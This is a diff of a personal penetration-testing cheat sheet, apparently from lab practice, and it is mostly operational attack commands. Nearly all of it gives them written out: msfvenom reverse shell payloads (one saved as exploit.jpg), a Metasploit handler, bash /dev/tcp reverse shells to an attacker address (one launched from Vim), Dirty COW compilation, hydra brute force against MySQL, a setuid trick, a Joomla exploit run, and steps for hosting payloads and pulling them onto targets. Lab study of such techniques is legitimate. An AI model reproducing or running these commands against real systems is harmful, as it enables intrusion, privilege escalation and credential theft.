@@ -1,14 +1,66 @@
+
+Date: 28/6/2021
+Name: Personal CheatSheet 
+This is getting updated after a shared Google Doc got removed for no good reason, it had the list of tools I gathered over time.
+
+Articles and useful links:
+PErsonal notes on Burp, Bloodhound and :
+https://docs.google.com/document/d/1p_hQ1jIuYsPt23EroJMmgkSYob6VdxVtO0a3sl3mLtw/edit?usp=sharing
+
+
+W3Af: 
+http://w3af.org/
+http://docs.w3af.org/en/latest/install.html 
+
+Password hash (other than JTR and Hydra) Patator:
+https://tools.kali.org/password-attacks/patator
+
+XSS and all: PwnXSS & XSSer
+
+Command injection testing:
+https://github.com/stasinopoulos/commix
+
+List of kali tools:
+https://tools.kali.org/tools-listing
+
+GUI for Aircrack NG:
+https://github.com/savio-code/fern-wifi-cracker
+
+Locate Wifi info:
+https://wigle.net/search
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+******************************************************************IGNORE, self reference only**************************************************
+Common nmap scans formats (lookup options for more reasons): AVOID using -sC unless needed (can cut down results):
 nmap -Pn -sT -sV -sC -O  -p 0-65535 10.11.1.36 -oA nmaptcpfullscan1
 nmap -Pn -sU -sV -O 10.11.1.36 -oA nmapudpscan
 nmap --script=smb-vuln* -p 139,445 10.11.1.83 
 
+Easy netcat tests: 
 nc -vlnp 8000
-
-
-DONE:
-Steven, John, Mantis, Anthony, Breeze, Android
-
-TO DO: James, AS45, CMS01
 
 Set up a listener to catch a reverse shell on meterpreter or whatever but set the payload accordingly:
 
@@ -19,9 +71,7 @@ msf5 exploit(multi/handler) > show options
 
 
 Post session:
-
 show sessions
-
 sessions -i 1
 
 
@@ -38,7 +88,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=172.16.2.2 LPORT=8000 R > exploit.jpg
 
 msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.2.2 LPORT=8000 -f raw > exploit1
 
-Exec a python script to do something:
+Exec a python script to do something: (standard, easy stuff, just noted during VHL)
 ./joomraa.py -u hacker -p password -e hacker@example.com -x exploit1.pht http://10.12.1.177:80
 
 Mysql login CLI
@@ -46,28 +96,28 @@ mysql://root:joomla@http://10.12.1.177:3306/joomla
 mysql --host=10.12.1.177 --user=root --password=joomla joomla
 
 
-
 Tools to convert image to text: tesseract
 Tool to add or edit image metadata: exiftool
 Tool to resize image through CLI: Magick
 
-
 Link for msfconsole stuff....
 https://netsec.ws/?p=331
 
-locate command to find a file or something
-
+Compile exploits in C:
 sudo apt-get install gcc-multilib
-To compile for different arch
+To compile for different arch:
 gcc -m32 source -o target
 
+Start or stop services:
 service apache2 restart
 
-OR use python simplehttpserver (easier, choose right directory)
-
-
+Host exploits for copy/paste on target:
+use python simplehttpserver (easier, choose right directory such as tmp or uploads)
 For ports to listen/send, use 443/80/standard ports.
+Host simple webserver
+python -m SimpleHTTPServer 80
 
+Then wget/curl or certutil for windows (insert approp links)
 
 PHP shell uploaded on target machine to listen to multiple ports and accept an exploit
 
@@ -79,15 +129,10 @@ Corresponding netcat listeners on attacking machine:
 nc -nlvp 80
 nc -nlvp 443 < a.out
 
-Detailed explanation on Ex-cop 2, page 26, 29/11/19
-
 Command to list every bit of info inside a folder:
 ls -asl
 
-Host simple webserver
-python -m SimpleHTTPServer 80
 
-Then wget/curl
 
 OPENVAS
 
@@ -99,4 +144,73 @@ User created with password '78e4cdcd-5bc2-4057-bdc3-b79f74ab7164'.
 
 Nikto shortcuts
 nikto -host 10.12.1.109 -port 135,139,445,554,2869,8009,8080,10243,49152,49153,49154,49159,49160
+
+
+hydra -l root  -P /usr/share/wordlists/rockyou.txt 10.12.1.11 mysql
+
+
+$ ls -lah foo
+-r-----r-- 1 root root
+Give attention:
+
+chown root:root ping && chmod 4755 ping
+
+
+Get command line terminal from meterpreter shell
+Get cmd:
+execute -f cmd.exe -i -H
+BEst ls versions, others being ls -s
+
+gcc cowroot.c -o cowroot -pthread
+Also check firefart
+
+Reverse shells:
+/bin/bash -c ' bash -i >& /dev/tcp/172.16.2.2/443 0>&1'
+
+
+From Vim exec commands (if bad permissions are present) :
+
+:! /bin/bash -c ' bash -i >& /dev/tcp/172.16.2.2/443 0>&1'
+
+
+From meterpreter shell, type getuid for privilege level/user name,
+type shell for linux shell, type " execute -f cmd.exe -i -H" for windows.
+
+Python breakout shell:
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
